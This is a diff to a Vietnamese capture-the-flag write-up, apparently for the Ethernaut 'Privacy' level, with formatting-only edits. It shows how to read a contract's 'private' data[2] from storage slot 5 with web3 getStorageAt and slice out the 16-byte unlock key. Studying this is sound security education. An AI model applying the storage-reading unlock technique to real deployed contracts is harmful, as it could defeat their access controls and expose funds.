@@ -48,11 +48,13 @@ contract Privacy {
 Tìm cách unlock contract.
 
 ## Phân tích
-- Quan sát hàm unlock thì ta cần giá trị của data[2]
+- Quan sát hàm unlock thì ta cần giá trị của data[2]  
+
 ```solidity
 function unlock(bytes16 _key) public {
     require(_key == bytes16(data[2]));
     locked = false;
+}
 ```
 - Nhìn qua lượt các biến 
 ```solidity
@@ -68,14 +70,16 @@ bytes32[3] private data;
 - Slot 1: ID
 - Slot 2: flattening, denomination, awkardness
 - Slot 3, 4, 5, 6: lần lượt là các biến của data
-=> data[2] ở slot 5
+=> data[2] ở slot 5  
+
 ## Solution
-- Lấy giá trị của data[2] ở slot 5
+- Lấy giá trị của data[2] ở slot 5  
+
 ```javascript
 str = await web3.eth.getStorageAt(instance, 5);
 0x682b111ececfad832e498e84761b9326f69965c5131428c6e6a18d477ba4c52d  
+```  
 
-```
 - Vì require chỉ cần 16 byte đầu 
 ```javascript
 key=str.slice(0,34)
